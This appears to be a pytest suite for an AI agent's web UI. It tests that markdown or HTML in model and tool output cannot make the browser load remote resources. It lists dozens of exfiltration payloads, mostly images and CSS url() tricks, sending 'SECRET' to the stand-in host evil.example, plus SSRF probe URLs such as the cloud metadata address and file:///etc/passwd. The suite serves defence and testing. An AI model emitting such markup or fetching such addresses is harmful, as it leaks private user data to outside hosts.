"""Model and tool output never makes the browser fetch from outside.

A reply, a fetched page or a tool result is untrusted text. If it can put
`![](https://attacker.example/?d=<private text>)` in front of the renderer,
the browser asks that host for the image the moment the reply paints, with the
private text in the query string, and no approval gate sees a thing. These
tests run the real renderer from index.html under node (with the vendored
marked) and pin the three layers that close the route:

  1. the markup sanitizer: no remote source ever reaches an element that loads
     (img/srcset/style url()/image-set), however it is encoded; a remote image
     becomes a click-to-load placeholder that names the host;
  2. the page CSP: img-src / media-src / connect-src admit only Friday itself;
  3. the click-to-load fetcher: a server-side fetch behind the SSRF guard that
     returns only raster images, so the page can show it from a blob: URL.
"""
import ast
import json
import pathlib
import re
import shutil
import subprocess

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[2]
node = shutil.which("node")
NL = chr(10)
PAGES = ("index.html", "ui_parts/app.html")
MARKED = ROOT / "static" / "vendor" / "marked-9.1.6.min.js"
CORE = ROOT / "src" / "agent_friday" / "core" / "__init__.py"

PIXEL = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="


def _text(path):
    return (ROOT / path).read_text(encoding="utf-8").replace("\r\n", NL)


def _slice(path, start, end):
    text = _text(path)
    a = text.index(start)
    return text[a:text.index(end, a)]


def _allowlist_source(path):
    """The sanitizer and the click-to-load handler, verbatim."""
    return _slice(path, "/* MARKUP ALLOWLIST.", "function renderFridayMarkdown(")


def _renderer_source(path):
    return _allowlist_source(path) + _slice(path, "function renderFridayMarkdown(", NL + "if")


# (label, markdown or html, the host the placeholder must name or None when the
# payload must simply load nothing)
REMOTE = [
    ("md https", "![x](https://evil.example/p.png?d=SECRET)", "evil.example"),
    ("md http", "![x](http://evil.example/p.png?d=SECRET)", "evil.example"),
    ("md upper-case scheme", "![x](HTTPS://EVIL.EXAMPLE/p.png?d=SECRET)", "evil.example"),
    ("md protocol-relative", "![x](//evil.example/p.png?d=SECRET)", "evil.example"),
    ("md backslash protocol-relative", "![x](\\\\evil.example/p.png?d=SECRET)", None),
    ("md slash-backslash", "![x](/\\evil.example/p.png?d=SECRET)", None),
    ("md reference link", "![x][r]" + NL + NL + "[r]: https://evil.example/p.png?d=SECRET", "evil.example"),
    ("md collapsed reference", "![r][]" + NL + NL + "[r]: //evil.example/p.png?d=SECRET", "evil.example"),
    ("md title form", "![x](https://evil.example/p.png?d=SECRET \"t\")", "evil.example"),
    ("html img", "<img src=\"https://evil.example/p.png?d=SECRET\">", "evil.example"),
    ("html img single quote", "<img src='https://evil.example/p.png?d=SECRET'>", "evil.example"),
    ("html img unquoted", "<img src=https://evil.example/p.png?d=SECRET>", None),
    ("html img protocol-relative", "<img src=\"//evil.example/p.png?d=SECRET\">", "evil.example"),
    ("html img entity scheme", "<img src=\"&#104;ttps://evil.example/p.png?d=SECRET\">", "evil.example"),
    ("html img hex entity colon", "<img src=\"https&#x3a;//evil.example/p.png?d=SECRET\">", "evil.example"),
    ("html img tab inside scheme", "<img src=\"ht&Tab;tps://evil.example/p.png?d=SECRET\">", "evil.example"),
    ("html img leading control", "<img src=\"\u0001 https://evil.example/p.png?d=SECRET\">", "evil.example"),
    ("html img srcset", "<img src=\"" + PIXEL + "\" srcset=\"https://evil.example/p.png?d=SECRET 2x\">", None),
    ("html img srcset only", "<img srcset=\"//evil.example/p.png?d=SECRET 1x\">", None),
    ("html picture source", "<picture><source srcset=\"https://evil.example/p.png?d=SECRET\"><img src=\"" + PIXEL + "\"></picture>", None),
    ("html img data svg", "<img src=\"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=\">", None),
    ("html video poster", "<video poster=\"https://evil.example/p.png?d=SECRET\" src=\"https://evil.example/v.mp4\"></video>", None),
    ("html object data", "<object data=\"https://evil.example/p.png?d=SECRET\"></object>", None),
    ("html link stylesheet", "<link rel=\"stylesheet\" href=\"https://evil.example/s.css?d=SECRET\">", None),
    ("html table background", "<table background=\"https://evil.example/p.png?d=SECRET\"><tr><td>x</td></tr></table>", None),
    ("css url", "<div style=\"background:url(https://evil.example/p.png?d=SECRET)\">x</div>", None),
    ("css url quoted", "<span style=\"background-image:url('//evil.example/p.png?d=SECRET')\">x</span>", None),
    ("css url escaped", "<div style=\"background:u\\72l(https://evil.example/p.png?d=SECRET)\">x</div>", None),
    ("css image-set", "<div style=\"background-image:image-set('https://evil.example/p.png?d=SECRET' 1x)\">x</div>", None),
    ("css webkit image-set", "<div style=\"background-image:-webkit-image-set('https://evil.example/p.png?d=SECRET' 1x)\">x</div>", None),
    ("css image()", "<div style=\"background-image:image('https://evil.example/p.png?d=SECRET')\">x</div>", None),
    ("css cross-fade", "<div style=\"background-image:cross-fade(url(//evil.example/a.png),url(//evil.example/b.png),50%)\">x</div>", None),
    ("css content url", "<p style=\"content:url(https://evil.example/p.png?d=SECRET)\">x</p>", None),
    ("css list-style", "<ul style=\"list-style-image:url(https://evil.example/p.png?d=SECRET)\"><li>x</li></ul>", None),
    ("css import", "<div style=\"@import 'https://evil.example/s.css'\">x</div>", None),
    ("css src()", "<div style=\"background-image:src('https://evil.example/p.png?d=SECRET')\">x</div>", None),
    ("iframe", "<iframe src=\"https://evil.example/?d=SECRET\"></iframe>", None),
    ("svg image", "<svg><image href=\"https://evil.example/p.png?d=SECRET\"></image></svg>", None),
    ("blob scheme", "![x](blob:https://evil.example/uuid)", None),
    ("ftp scheme", "![x](ftp://evil.example/p.png)", None),
]

# Remote sources that must never be visible to the page as a loadable URL:
# only the placeholder's own data attribute may carry one.
LOCAL = [
    ("api creations", "![x](/api/creations/pic.png)", "/api/creations/pic.png"),
    ("relative", "![x](pic.png)", "pic.png"),
    ("assets", "![x](/static/galaxy/star_glow.png)", "/static/galaxy/star_glow.png"),
    ("data png", "![x](" + PIXEL + ")", PIXEL),
    ("html img local", "<img src=\"/api/creations/pic.png\" alt=\"a\">", "/api/creations/pic.png"),
]

HARNESS = r"""
const marked = require(MARKED_PATH);
globalThis.marked = marked;
function fridayName(){return 'Friday'}
function fridayCitationize(s){return s}
function fridayEscapeHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function fridayFallbackMd(s){return fridayEscapeHtml(s)}
CODE
const remote = REMOTE.map(([label, md]) => ({label, html: renderFridayMarkdown(md)}));
const local = LOCAL.map(([label, md]) => ({label, html: renderFridayMarkdown(md)}));
const prose = renderFridayMarkdown('see https://evil.example/p.png?d=SECRET for the picture');
console.log(JSON.stringify({remote, local, prose}));
"""


def _run(path, tmp_path):
    script = tmp_path / "h.js"
    script.write_text(
        HARNESS.replace("MARKED_PATH", json.dumps(str(MARKED)))
        .replace("REMOTE.map", json.dumps([[a, b] for a, b, _ in REMOTE]) + ".map")
        .replace("LOCAL.map", json.dumps([[a, b] for a, b, _ in LOCAL]) + ".map")
        .replace("CODE", _renderer_source(path)),
        encoding="utf-8")
    cp = subprocess.run([node, str(script)], capture_output=True, text=True, timeout=120)
    assert cp.returncode == 0, cp.stderr
    return json.loads(cp.stdout.strip().splitlines()[-1])


# An attribute or declaration through which a browser would fetch a resource.
_LOADING_ATTR = re.compile(r"""\s(?:src|srcset|poster|data|background|ping|action|formaction)\s*=\s*("([^"]*)"|'([^']*)')""", re.I)
_REMOTE_LOOKING = re.compile(r"^\s*(?:[a-z][a-z0-9+.\-]*:)?[\\/]{2}|^\s*https?:", re.I)


def _loads_something_remote(html):
    """True when any real tag in `html` has a loading attribute or style value
    that could make the browser request a non-local address. Escaped text
    (`&lt;img ...`) is not a tag and loads nothing."""
    for tag in re.findall(r"<[a-zA-Z][^>]*>", html):
        for m in _LOADING_ATTR.finditer(tag):
            val = m.group(2) if m.group(2) is not None else m.group(3)
            if _REMOTE_LOOKING.search(val):
                return True
            if re.match(r"\s*(?:blob|ftp|file):", val, re.I):
                return True
        for m in re.finditer(r"""\sstyle\s*=\s*("([^"]*)"|'([^']*)')""", tag, re.I):
            val = m.group(2) if m.group(2) is not None else m.group(3)
            if re.search(r"url\s*\(|image-set|image\s*\(|src\s*\(|cross-fade|@import|evil\.example", val, re.I):
                return True
    return False


def _strip_placeholders(html):
    """The click-to-load placeholder carries the URL in a data attribute that
    nothing loads from; take those out before looking for loading attributes."""
    return re.sub(r"<span class=\"friday-remote-img\"[^>]*>.*?</span>", "", html, flags=re.S)


@pytest.mark.parametrize("path", PAGES)
def test_mirror_carries_the_same_renderer(path):
    assert _allowlist_source("index.html") == _allowlist_source("ui_parts/app.html")


@pytest.mark.skipif(not node, reason="node is not on PATH")
@pytest.mark.parametrize("path", ["index.html"])
def test_no_remote_source_reaches_an_element_that_loads(path, tmp_path):
    res = _run(path, tmp_path)
    leaks = [(r["label"], r["html"]) for r in res["remote"]
             if _loads_something_remote(_strip_placeholders(r["html"]))]
    assert not leaks, leaks


@pytest.mark.skipif(not node, reason="node is not on PATH")
def test_a_remote_image_becomes_a_placeholder_that_names_the_host(tmp_path):
    res = _run("index.html", tmp_path)
    for (label, _md, host), r in zip(REMOTE, res["remote"]):
        if not host:
            continue
        html = r["html"]
        assert 'class="friday-remote-img"' in html, (label, html)
        assert host in re.sub(r"<[^>]*>", "", html).lower(), (label, html)
        assert re.search(r'data-remote-src="https?://' + re.escape(host), html, re.I), (label, html)
        assert "<img" not in html.lower(), (label, html)


@pytest.mark.skipif(not node, reason="node is not on PATH")
def test_the_placeholder_only_ever_carries_http_or_https(tmp_path):
    res = _run("index.html", tmp_path)
    for r in res["remote"]:
        for m in re.finditer(r'data-remote-src="([^"]*)"', r["html"]):
            assert re.match(r"https?://[^/\\\s]+", m.group(1), re.I), (r["label"], m.group(1))


@pytest.mark.skipif(not node, reason="node is not on PATH")
def test_local_and_data_images_still_render(tmp_path):
    res = _run("index.html", tmp_path)
    for (label, _md, want), r in zip(LOCAL, res["local"]):
        assert "<img" in r["html"] and 'src="' + want + '"' in r["html"], (label, r["html"])
        assert "friday-remote-img" not in r["html"], (label, r["html"])


@pytest.mark.skipif(not node, reason="node is not on PATH")
def test_plain_text_urls_stay_text(tmp_path):
    res = _run("index.html", tmp_path)
    assert "<img" not in res["prose"]
    assert "evil.example" in res["prose"]


# ── the click handler ────────────────────────────────────────────────────────

@pytest.mark.parametrize("path", PAGES)
def test_the_click_handler_goes_through_the_server_and_shows_the_host(path):
    text = _text(path)
    assert "/api/remote-image" in text
    handler = _slice(path, "function fridayLoadRemoteImage", NL + "}" + NL)
    assert "URL.createObjectURL" in handler
    # The page never sets an http(s) src itself: every src it assigns is the
    # object URL it made from the server's bytes.
    assert all(m == "objUrl" for m in re.findall(r"\.src\s*=\s*(\w+)", handler)), handler
    assert "host" in handler


# ── CSP ──────────────────────────────────────────────────────────────────────

def _csp_namespace():
    """OWN_PAGE_CSP and the sandbox helpers, read from source so the test needs
    no import of the server."""
    tree = ast.parse(CORE.read_text(encoding="utf-8"))
    ns = {}
    keep = {"OWN_PAGE_CSP", "SANDBOX_DEFAULT_TOKENS", "_SANDBOX_NEVER", "SANDBOX_NO_REMOTE_CSP",
            "_LOCAL_SOURCES", "_split_csp", "_sandboxed_csp"}
    for node_ in tree.body:
        names = []
        if isinstance(node_, ast.Assign):
            names = [t.id for t in node_.targets if isinstance(t, ast.Name)]
        elif isinstance(node_, ast.FunctionDef):
            names = [node_.name]
        if keep & set(names):
            exec(compile(ast.Module([node_], []), str(CORE), "exec"), ns)
    return ns


def _directive(csp, name):
    for part in csp.split(";"):
        bits = part.split()
        if bits and bits[0].lower() == name:
            return bits[1:]
    return None


def test_page_csp_admits_only_itself_for_images_media_and_connections():
    csp = _csp_namespace()["OWN_PAGE_CSP"]
    img = _directive(csp, "img-src")
    assert img is not None and set(img) == {"'self'", "data:", "blob:"}, csp
    media = _directive(csp, "media-src")
    assert media is not None and not any(t.startswith(("http:", "https:", "*")) for t in media), csp
    conn = _directive(csp, "connect-src")
    assert conn is not None and "'self'" in conn, csp
    assert "*" not in conn and "http:" not in conn and "https:" not in conn, csp
    # The one CDN the opt-in hand tracking compiles from is the only outside host.
    assert [t for t in conn if t.startswith("https://")] == ["https://cdn.jsdelivr.net"], csp
    font = _directive(csp, "font-src")
    assert font is not None and not any(t.startswith(("http:", "https:", "*")) for t in font), csp


def test_page_csp_keeps_preview_capabilities_behind_a_trusted_wrapper():
    csp = _csp_namespace()["OWN_PAGE_CSP"]
    assert set(_directive(csp, "frame-src")) == {"'self'", "blob:", "data:"}
    for directive in ("script-src", "connect-src", "img-src", "font-src", "media-src"):
        assert "http://*.localhost:*" not in _directive(csp, directive)


def test_sandboxed_documents_cannot_load_remote_images_or_connect_out():
    ns = _csp_namespace()
    out = ns["_sandboxed_csp"]("")
    img = _directive(out, "img-src")
    assert img is not None and not any(t.startswith(("http:", "https:", "*")) for t in img), out
    assert _directive(out, "connect-src") == ["'none'"], out
    assert _directive(out, "form-action") == ["'none'"], out
    # An existing policy is kept and never widened.
    wide = ns["_sandboxed_csp"]("img-src https://x.example; connect-src *")
    assert _directive(wide, "img-src") is not None
    assert not any(t.startswith(("http:", "https:", "*")) for t in _directive(wide, "img-src")), wide
    assert _directive(wide, "connect-src") == ["'none'"], wide


# ── the click-to-load fetcher ────────────────────────────────────────────────

class _Resp:
    def __init__(self, body=b"", ctype="image/png", status=200, declared=True):
        self.content = body
        self.status_code = status
        self.headers = {"content-type": ctype}
        if declared:
            self.headers["content-length"] = str(len(body))

    def iter_content(self, chunk_size=65536):
        for i in range(0, len(self.content), chunk_size):
            yield self.content[i:i + chunk_size]

    def close(self):
        pass


PNG = bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489")


@pytest.fixture
def ri(monkeypatch):
    from agent_friday.services import remote_image
    return remote_image


def test_fetch_refuses_private_and_loopback_hosts(ri, monkeypatch):
    import requests
    touched = []
    monkeypatch.setattr(requests, "get", lambda *a, **k: touched.append(a) or _Resp(PNG))
    for url in ("http://127.0.0.1:3000/api/x.png", "http://169.254.169.254/x.png",
                "http://localhost/x.png", "http://10.0.0.5/x.png", "file:///etc/passwd",
                "ftp://example.com/x.png", "javascript:alert(1)"):
        with pytest.raises(ri.RemoteImageRefused):
            ri.fetch_image(url)
    assert touched == [], "a refused address must never be requested"


def test_fetch_returns_only_raster_images(ri, monkeypatch):
    monkeypatch.setattr(ri.web_safety, "safe_get", lambda *a, **k: _Resp(PNG, "image/png"))
    body, ctype = ri.fetch_image("https://example.com/x.png")
    assert body == PNG and ctype == "image/png"
    for bad in ("image/svg+xml", "text/html", "application/octet-stream", "text/plain"):
        monkeypatch.setattr(ri.web_safety, "safe_get", lambda *a, _b=bad, **k: _Resp(b"<svg/>", _b))
        with pytest.raises(ri.RemoteImageRefused):
            ri.fetch_image("https://example.com/x")


def test_fetch_caps_the_size(ri, monkeypatch):
    monkeypatch.setattr(ri, "MAX_BYTES", 1000)
    big = PNG + b"0" * 2000
    # A host that states the size, and one that does not: both are refused.
    for declared in (True, False):
        monkeypatch.setattr(ri.web_safety, "safe_get",
                            lambda *a, _d=declared, **k: _Resp(big, "image/png", declared=_d))
        with pytest.raises(ri.RemoteImageRefused):
            ri.fetch_image("https://example.com/x.png")


def test_fetch_refuses_a_file_that_is_not_the_picture_it_claims(ri, monkeypatch):
    monkeypatch.setattr(ri.web_safety, "safe_get", lambda *a, **k: _Resp(b"<html>not a png</html>", "image/png"))
    with pytest.raises(ri.RemoteImageRefused):
        ri.fetch_image("https://example.com/x.png")


def test_fetch_sends_no_identity(ri, monkeypatch):
    seen = {}

    def fake(url, **kw):
        seen.update(kw)
        return _Resp(PNG, "image/png")
    monkeypatch.setattr(ri.web_safety, "safe_get", fake)
    ri.fetch_image("https://example.com/x.png")
    hdr = {k.lower(): v for k, v in (seen.get("headers") or {}).items()}
    assert not {"cookie", "authorization", "referer", "x-friday-token"} & set(hdr)


def test_the_mail_signature_cleaner_drops_remote_images():
    """A Gmail signature goes into Friday's own page; a remote logo would be
    fetched the moment it is inserted. Inline raster data is all that stays."""
    text = _text("static/friday_mail.js")
    body = text[text.index("const cleanSig"):text.index("return d.body.innerHTML", text.index("const cleanSig"))]
    assert "k === 'srcset'" in body
    rule = next(l for l in body.splitlines() if "k === 'src'" in l)
    assert "data:image" in rule and "https?" not in rule, rule
